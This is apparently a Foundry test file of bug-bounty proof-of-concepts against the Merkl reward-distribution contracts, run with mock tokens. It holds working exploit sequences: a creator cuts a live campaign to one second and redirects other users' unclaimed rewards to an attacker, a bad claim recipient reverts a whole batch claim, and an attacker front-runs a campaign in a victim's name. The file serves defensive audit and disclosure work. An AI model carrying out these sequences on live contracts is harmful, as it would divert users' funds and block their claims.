// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "merkl/AccessControlManager.sol";
import "merkl/Distributor.sol";
import "merkl/DistributionCreator.sol";
import "merkl/struct/CampaignParameters.sol";
import "merkl/mock/MockToken.sol";
import "merkl/mock/MockClaimRecipient.sol";
import "merkl/partners/tokenWrappers/PullTokenWrapperTransferImmutable.sol";

/// @notice Read-only audit PoCs for the Merkl bug bounty (docs.merkl.xyz/bug-bounty).
/// All actors are test addresses, all funds are mock tokens minted in-test.
/// NO mainnet, NO live chain, NO user funds, NO submission.
contract MerklAuditTest is Test {
    AccessControlManager acm;
    Distributor distributor;
    DistributionCreator dc;
    MockToken token;

    address governor = makeAddr("governor");
    address guardian = makeAddr("guardian");
    address creator = makeAddr("creator");
    address victim = makeAddr("victim");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address attacker = makeAddr("attacker");
    address operator = makeAddr("operator");
    address holder = makeAddr("holder");
    address feeRecipient = makeAddr("feeRecipient");

    function setUp() public {
        AccessControlManager acmImpl = new AccessControlManager();
        acm = AccessControlManager(
            address(
                new ERC1967Proxy(
                    address(acmImpl),
                    abi.encodeCall(AccessControlManager.initialize, (governor, guardian))
                )
            )
        );
        Distributor distImpl = new Distributor();
        distributor = Distributor(
            address(
                new ERC1967Proxy(
                    address(distImpl),
                    abi.encodeCall(Distributor.initialize, (IAccessControlManager(address(acm))))
                )
            )
        );
        DistributionCreator dcImpl = new DistributionCreator();
        dc = DistributionCreator(
            address(
                new ERC1967Proxy(
                    address(dcImpl),
                    abi.encodeCall(
                        DistributionCreator.initialize,
                        (IAccessControlManager(address(acm)), address(distributor), 0)
                    )
                )
            )
        );
        token = new MockToken("Reward", "RWD", 18);

        address[] memory tokens = new address[](1);
        tokens[0] = address(token);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1e15; // min rate: 0.001 RWD / hour
        vm.prank(governor);
        dc.setRewardTokenMinAmounts(tokens, amounts);
        // Live deployments have a non-zero feeRecipient
        // (0xeac6A75e19BEb1283352D24c0311dE865A867dab on BSC/mainnet/arbitrum/base)
        vm.prank(governor);
        dc.setFeeRecipient(feeRecipient);

        token.mint(creator, 100_000 ether);
        token.mint(attacker, 100_000 ether);
        token.mint(address(distributor), 100_000 ether);
        vm.prank(creator);
        token.approve(address(dc), type(uint256).max);
        vm.prank(attacker);
        token.approve(address(dc), type(uint256).max);
    }

    function _makeCampaign(
        address _creator,
        uint32 start,
        uint32 duration,
        uint256 amount
    ) internal view returns (CampaignParameters memory) {
        return
            CampaignParameters({
                campaignId: bytes32(0),
                creator: _creator,
                rewardToken: address(token),
                amount: amount,
                campaignType: 0,
                startTimestamp: start,
                duration: duration,
                campaignData: ""
            });
    }

    // =========================================================================
    // PoC-A (CANDIDATE #1, highest priority):
    // overrideCampaign can early-end a LIVE campaign (duration -> 1s) because
    // the post-audit code removed the end-date-in-future check; the min-rate
    // check passes trivially at duration=1. reallocateCampaignRewards then
    // becomes callable and lets the creator redirect ANY address's unclaimed
    // rewards to ANY address. The on-chain mechanics are fully proven here.
    // Whether the OFF-CHAIN engine honours the overridden end (and the
    // reallocation of already-earned amounts) is NOT provable on a fork and
    // needs a live-chain test with own funds (see AUDIT notes).
    // =========================================================================
    function test_OverrideEarlyEndAndReallocate() public {
        uint32 start = uint32(block.timestamp + 3600);
        uint32 duration = 30 days;
        uint256 amount = 1000 ether;

        vm.prank(creator);
        bytes32 id = dc.createCampaign(_makeCampaign(creator, start, duration, amount));
        assertEq(dc.campaign(id).duration, duration, "original duration stored");

        // Campaign is LIVE (1 day in, 29 days remaining per original params)
        vm.warp(start + 1 days);

        // Reallocation must FAIL before the override: original end not reached
        address[] memory froms = new address[](2);
        froms[0] = user1;
        froms[1] = user2;
        vm.prank(creator);
        vm.expectRevert();
        dc.reallocateCampaignRewards(id, froms, attacker);

        // Creator overrides duration to 1 second (no end-date check anymore)
        CampaignParameters memory ov = _makeCampaign(creator, start, 1, amount);
        vm.prank(creator);
        dc.overrideCampaign(id, ov);

        // Latest params now say the campaign lasts 1 second; original is untouched
        assertEq(dc.getLatestCampaignParams(id).duration, 1, "override duration = 1s");
        assertEq(dc.campaign(id).duration, duration, "original duration unchanged");

        // 1 second after start, the OVERRIDDEN end has passed
        vm.warp(start + 2);

        // Reallocation now SUCCEEDS and redirects user1/user2 rewards to attacker
        vm.prank(creator);
        dc.reallocateCampaignRewards(id, froms, attacker);
        assertEq(dc.campaignReallocation(id, user1), attacker, "user1 reallocated to attacker");
        assertEq(dc.campaignReallocation(id, user2), attacker, "user2 reallocated to attacker");
    }

    // =========================================================================
    // PoC-B (CANDIDATE #2, Low): after the post-audit removal of the try/catch
    // around onClaim (C4 M-02 fix), ONE reverting/wrong-magic onClaim callback
    // reverts an ENTIRE batch claimWithRecipient. A bad recipient therefore
    // griefs every other user in the same operator batch (until the operator
    // excludes them or claims individually).
    // =========================================================================
    function test_BatchGriefingRevertingOnClaim() public {
        bytes32 leaf1 = keccak256(abi.encode(user1, address(token), uint256(100 ether)));
        bytes32 leaf2 = keccak256(abi.encode(user2, address(token), uint256(50 ether)));
        bytes32 root = leaf1 < leaf2
            ? keccak256(abi.encodePacked(leaf1, leaf2))
            : keccak256(abi.encodePacked(leaf2, leaf1));

        vm.prank(governor);
        distributor.updateTree(MerkleTree({merkleRoot: root, ipfsHash: bytes32(0)}));
        vm.warp(distributor.endOfDisputePeriod() + 1);
        assertEq(distributor.getMerkleRoot(), root, "tree active");

        // user2 points their claim recipient at a contract returning the WRONG magic value
        MockClaimRecipientWrongReturn bad = new MockClaimRecipientWrongReturn();
        vm.prank(user2);
        distributor.setClaimRecipient(address(bad), address(token));

        // Both users authorise a shared operator
        vm.prank(user1);
        distributor.toggleOperator(user1, operator);
        vm.prank(user2);
        distributor.toggleOperator(user2, operator);

        address[] memory users = new address[](2);
        users[0] = user1;
        users[1] = user2;
        address[] memory tokens = new address[](2);
        tokens[0] = address(token);
        tokens[1] = address(token);
        uint256[] memory amts = new uint256[](2);
        amts[0] = 100 ether;
        amts[1] = 50 ether;
        bytes32[][] memory proofs = new bytes32[][](2);
        proofs[0] = new bytes32[](1);
        proofs[0][0] = leaf2;
        proofs[1] = new bytes32[](1);
        proofs[1][0] = leaf1;
        address[] memory recips = new address[](2);
        recips[0] = user1;
        recips[1] = user2;
        bytes[] memory datas = new bytes[](2);
        datas[0] = ""; // user1: no callback
        datas[1] = hex"1234"; // user2: callback fires on the bad recipient

        // The whole batch reverts because of user2's bad recipient
        vm.prank(operator);
        vm.expectRevert();
        distributor.claimWithRecipient(users, tokens, amts, proofs, recips, datas);
        (uint208 claimedBefore,,) = distributor.claimed(user1, address(token));
        assertEq(uint256(claimedBefore), 0, "user1 claim blocked by batch revert");

        // user1 claiming ALONE (no data, no callback) works fine
        address[] memory u1 = new address[](1);
        u1[0] = user1;
        address[] memory t1 = new address[](1);
        t1[0] = address(token);
        uint256[] memory a1 = new uint256[](1);
        a1[0] = 100 ether;
        bytes32[][] memory p1 = new bytes32[][](1);
        p1[0] = new bytes32[](1);
        p1[0][0] = leaf2;
        vm.prank(user1);
        distributor.claim(u1, t1, a1, p1);
        (uint208 claimedAfter,,) = distributor.claimed(user1, address(token));
        assertEq(uint256(claimedAfter), 100 ether, "user1 solo claim ok");
        assertEq(token.balanceOf(user1), 100 ether, "user1 received tokens");
    }

    // =========================================================================
    // PoC-C (BEHAVIOURAL, no finding): PullTokenWrapperTransferImmutable
    // delivers the underlying on claim, burns wX for non-allowed recipients,
    // gives the holder 0 on reclaim, and honours self-set opt-out/cap.
    // Confirms the wrapper behaves as designed (no theft path).
    // =========================================================================
    function test_WrapperTransferDeliveryAndBurn() public {
        PullTokenWrapperTransferImmutable w = new PullTokenWrapperTransferImmutable(
            address(token),
            address(dc),
            holder
        );
        // Wrapper must be pre-funded with underlying
        token.mint(address(w), 1000 ether);
        // Holder mints wX to the distributor (funding) and to user1 (allowed)
        vm.prank(holder);
        w.mint(address(distributor), 500 ether);
        vm.prank(holder);
        w.mint(user1, 10 ether);

        // Claim to ALLOWED user1: underlying delivered, wX kept
        vm.prank(address(distributor));
        w.transfer(user1, 100 ether);
        assertEq(token.balanceOf(user1), 100 ether, "user1 got underlying");
        assertEq(w.balanceOf(user1), 110 ether, "allowed user keeps wX");

        // Claim to NON-allowed user2: underlying delivered, wX burned
        vm.prank(address(distributor));
        w.transfer(user2, 50 ether);
        assertEq(token.balanceOf(user2), 50 ether, "user2 got underlying");
        assertEq(w.balanceOf(user2), 0, "non-allowed wX burned");

        // Reclaim to holder: 0 underlying (by design), wX kept
        vm.prank(address(distributor));
        w.transfer(holder, 100 ether);
        assertEq(token.balanceOf(holder), 0, "holder gets 0 underlying on reclaim");
        assertEq(w.balanceOf(holder), 100 ether, "holder keeps wX");

        // Self opt-out (sentinel 1): 0 underlying
        vm.prank(user2);
        w.setAmountToTransfer(1);
        vm.prank(address(distributor));
        w.transfer(user2, 25 ether);
        assertEq(token.balanceOf(user2), 50 ether, "opted-out user gets 0 more");
        assertEq(w.balanceOf(user2), 0, "opted-out wX burned");

        // Self cap: only 10 of 50 delivered
        vm.prank(user2);
        w.setAmountToTransfer(10 ether);
        vm.prank(address(distributor));
        w.transfer(user2, 50 ether);
        assertEq(token.balanceOf(user2), 60 ether, "capped user gets cap only");
    }

    // =========================================================================
    // PoC-E (EDGE CASE, defense-in-depth note — NOT a live finding):
    // PullTokenWrapperTransferImmutable._beforeTokenTransfer checks
    // `to == feeRecipient`. If a DistributionCreator's feeRecipient is still
    // address(0) (never set by the governor), then the internal _burn in
    // _afterTokenTransfer (to == address(0)) ALSO matches the feeRecipient
    // branch and tries to send underlying to address(0) -> the whole claim
    // to a non-allowed user reverts. Live deployments are NOT affected:
    // feeRecipient = 0xeac6A75e19BEb1283352D24c0311dE865A867dab on BSC, mainnet,
    // arbitrum and base (verified on-chain 20 Nov 2026). Only a fresh chain
    // deployment where the governor has not set a feeRecipient yet would hit
    // this (claims to non-allowed users would revert until setFeeRecipient
    // is called on the wrapper).
    // =========================================================================
    function test_WrapperBurnRevertsWhenFeeRecipientZero() public {
        // Fresh DC with feeRecipient NEVER set (address(0))
        DistributionCreator dcImpl2 = new DistributionCreator();
        DistributionCreator dc2 = DistributionCreator(
            address(
                new ERC1967Proxy(
                    address(dcImpl2),
                    abi.encodeCall(
                        DistributionCreator.initialize,
                        (IAccessControlManager(address(acm)), address(distributor), 0)
                    )
                )
            )
        );
        assertEq(dc2.feeRecipient(), address(0), "feeRecipient unset");

        PullTokenWrapperTransferImmutable w = new PullTokenWrapperTransferImmutable(
            address(token),
            address(dc2),
            holder
        );
        assertEq(w.feeRecipient(), address(0), "wrapper cached feeRecipient = 0");
        token.mint(address(w), 1000 ether);
        vm.prank(holder);
        w.mint(address(distributor), 500 ether);

        // Claim to NON-allowed user2: the burn's hook matches feeRecipient==0
        // and reverts the entire claim
        vm.prank(address(distributor));
        vm.expectRevert();
        w.transfer(user2, 50 ether);
        assertEq(token.balanceOf(user2), 0, "no underlying delivered (reverted)");
    }

    // =========================================================================
    // PoC-D (CONFIRMED KNOWN — Zellic V12 #5, DO NOT REPORT): campaignId is
    // deterministic and includes creator, so an attacker who copies a victim's
    // exact params can pre-create the campaign IN THE VICTIM'S NAME (paying
    // from their own wallet via the _pullTokens msg.sender fallback). The
    // victim's own identical creation then reverts CampaignAlreadyExists.
    // =========================================================================
    function test_CampaignIdCollisionCreatorVictim() public {
        uint32 start = uint32(block.timestamp + 3600);
        uint32 duration = 7 days;
        uint256 amount = 500 ether;

        // Attacker front-runs: creates the victim's campaign, paying themselves
        vm.prank(attacker);
        bytes32 id = dc.createCampaign(_makeCampaign(victim, start, duration, amount));
        assertEq(dc.campaign(id).creator, victim, "campaign attributed to victim");
        assertEq(token.balanceOf(attacker), 100_000 ether - amount, "attacker paid");

        // Victim's own identical creation now reverts
        vm.prank(victim);
        vm.expectRevert();
        dc.createCampaign(_makeCampaign(victim, start, duration, amount));
    }
}
